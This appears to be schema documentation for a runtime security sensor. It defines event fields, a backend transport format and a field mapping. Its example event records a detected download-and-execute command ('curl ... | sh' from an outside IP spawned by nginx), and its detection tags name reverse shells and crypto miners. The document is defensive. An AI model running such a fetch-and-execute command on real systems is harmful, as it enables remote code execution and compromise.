# Runtime Event Schema v1.0

Every observation the sensor makes is one **RuntimeEvent** JSON object.

- Python model: [`runtime_sensor/schema.py`](runtime_sensor/schema.py) (stdlib dataclasses; `validate_event_dict()` for structural checks)
- JSON Schema: [`schema/runtime-event.schema.json`](schema/runtime-event.schema.json) (draft 2020-12)
- A unit test (`tests/test_schema.py::test_json_schema_file_matches_model`) keeps the JSON Schema and the dataclasses in sync.

## Top-level fields

All top-level keys are always present. Sections that don't apply to the event type are `null`.

| Field | Type | Notes |
|---|---|---|
| `schema_version` | string | `"1.0"` |
| `event_id` | string (UUIDv4) | unique per event; use for de-duplication |
| `timestamp` | string | ISO8601 UTC, millisecond precision, `Z` suffix, e.g. `2026-10-14T14:49:00.557Z` |
| `sensor_id` | string | `SENSOR_ID`, defaults to hostname / node name |
| `host` | string | hostname, or the Kubernetes node name when `NODE_NAME` is set |
| `event_type` | enum | `process_exec`, `network_connect`, `network_accept`, `file_access`, `library_loaded`, `privilege_change` |
| `container_id` | string \| null | 64-hex ID parsed from `/proc/<pid>/cgroup` (docker, containerd, CRI-O, podman). `null` = host process |
| `k8s` | object \| null | `{namespace, pod, node, pod_uid, container}` |
| `process` | object \| null | see below. Required for `process_exec` and `privilege_change` |
| `network` | object \| null | required for `network_connect` / `network_accept` |
| `file` | object \| null | required for `file_access` |
| `library` | object \| null | required for `library_loaded` |
| `cloud` | object \| null | `{provider, resource_id}` |
| `severity_hint` | enum | `info` (default), `low`, `medium`, `high`, `critical`. Set by local pre-filtering; it's a hint, and the backend decides |
| `tags` | string[] | detection tags such as `reverse_shell`, `crypto_miner`, `mitre:T1059`, `euid:1000->0`, `source:ebpf` |

### `process`
| Field | Type | Notes |
|---|---|---|
| `pid` | int | host PID namespace |
| `ppid` | int \| null | |
| `name` | string \| null | `comm` (max 15 chars) |
| `exe` | string \| null | resolved `/proc/<pid>/exe`, as seen inside the process' mount namespace |
| `cmdline` | string \| null | space-joined argv, **secrets redacted**, truncated to 1024 chars |
| `uid` / `euid` | int \| null | real and effective uid |
| `user` | string \| null | uid resolved via the host `/etc/passwd` (numeric string if unknown) |
| `parent_name` | string \| null | parent's `comm` |

### `network`
| Field | Type | Notes |
|---|---|---|
| `src_ip`, `src_port` | string, int | initiator side |
| `dst_ip`, `dst_port` | string, int | for `network_accept`, `dst` is the local listening socket |
| `protocol` | string | `tcp` |
| `direction` | enum | `outbound` (`network_connect`) or `inbound` (`network_accept`) |

IPv4-mapped IPv6 addresses (`::ffff:a.b.c.d`) are reported as plain IPv4.

### `file`
| Field | Type | Notes |
|---|---|---|
| `path` | string | host path (the `--host-root` prefix is stripped) |
| `operation` | enum | `open`, `write`, `attrib`, `create`, `delete`, `rename` |

File contents are never read. inotify doesn't identify the acting process, so `process` is `null` on file events.

### `library`
| Field | Type | Notes |
|---|---|---|
| `path` | string | mapped file path from `/proc/<pid>/maps` (inside the process' root fs) |
| `package` | string \| null | OS package (`libssl3`), Python distribution (`numpy`), or soname guess (`libssl`) |
| `version` | string \| null | package version when resolvable |
| `kind` | enum | `shared_object` or `python_package` |
| `source` | enum \| null | how `package`/`version` was resolved: `dpkg`, `apk`, `dist-info`, `soname` |

A `library_loaded` event means the library is **mapped into a live process right now**. The same `(mount namespace, path)` is re-sent every hour (`reemit_after`) as a heartbeat, so the backend can expire stale "in use" flags.

### `k8s`
`namespace`, `pod`, `container` come from the Kubernetes API (pods on this node, matched by container ID). `node` comes from the downward API (`NODE_NAME`). `pod_uid` comes from the cgroup path. Any of them can be `null`.

### `cloud`
`provider` is `aws`, `gcp`, `azure` or `null`, detected offline from DMI (`/sys/class/dmi/id`). `resource_id` is the EC2 instance ID (Nitro), the Azure VM UUID, or the `SENSOR_CLOUD_RESOURCE_ID` override (e.g. a full ARM ID).

## Example

```json
{
  "schema_version": "1.0",
  "event_id": "3fbcf46d-ac5e-4252-b23c-62f38640da86",
  "timestamp": "2026-10-14T14:49:00.557Z",
  "sensor_id": "aks-node-1",
  "host": "aks-node-1",
  "event_type": "process_exec",
  "container_id": "3f1c000000000000000000000000000000000000000000000000000000009a2b",
  "k8s": {"namespace": "shop", "pod": "web-7d9f8", "node": "aks-node-1",
          "pod_uid": "1b2c3d4e-5f60-7182-93a4-b5c6d7e8f901", "container": "nginx"},
  "process": {"pid": 48211, "ppid": 48190, "name": "sh", "exe": "/bin/sh",
              "cmdline": "/bin/sh -c curl -s http://203.0.113.7/x.sh | sh",
              "uid": 33, "euid": 33, "user": "www-data", "parent_name": "nginx"},
  "network": null,
  "file": null,
  "library": null,
  "cloud": {"provider": "azure", "resource_id": "/subscriptions/0000/.../virtualMachines/1"},
  "severity_hint": "high",
  "tags": ["shell_spawned_by_web_server", "mitre:T1505.003", "download_and_execute", "mitre:T1105"]
}
```

## Transport (POST body)

`--payload-format` / `SENSOR_PAYLOAD_FORMAT` controls the body sent to `SENSOR_API_URL`:

| Format | Body | Use when |
|---|---|---|
| `cnapp-mvp` | JSON array translated to the backend's current `RuntimeEventIn` model (see [`runtime_sensor/compat.py`](runtime_sensor/compat.py)) | talking to `backend/` as it exists on `feature/cnapp-mvp` |
| `list` (default) | JSON array of native v1.0 events | the backend accepts schema v1.0 natively (it does since the integration branch) |
| `envelope` | `{"sensor_id", "sensor_version", "sent_at", "events": [...]}` | the backend wants batch metadata |

Headers: `Content-Type: application/json`, `Authorization: Bearer <SENSOR_API_TOKEN>` (when set), `X-Sensor-Id`, `User-Agent: cnapp-runtime-sensor/<version>`.

### `cnapp-mvp` mapping

| Native v1.0 | Backend `RuntimeEventIn` |
|---|---|
| `network_connect`, `network_accept` | `event_type: network_connection` (+ `network.direction`) |
| `privilege_change` | `event_type: privilege_escalation`, `privilege: {from_uid, to_uid, method: "setuid"}` |
| `library_loaded` | **not sent** (the backend has no field for it yet; counted in `stats.skipped_unsupported`) |
| `container_id` + `k8s` | `container: {id, name, pod, namespace}` |
| `file.operation` open/write/create/rename/delete/attrib | `read`/`write`/`write`/`write`/`delete`/`chmod` |
| `cloud.resource_id` | `asset_id` |
| `severity_hint`, `tags`, `event_id`, `host`, `k8s.node`, `cloud.provider` | `labels` (string map) |

**Backend integration:** the backend accepts native v1.0 events and matches `library.package`/`library.version` on the resolved asset (k8s pod, `cloud.resource_id`, or VM by `host`) against its vulnerability records to set `in_use` (see `backend/app/services/sensor.py`).
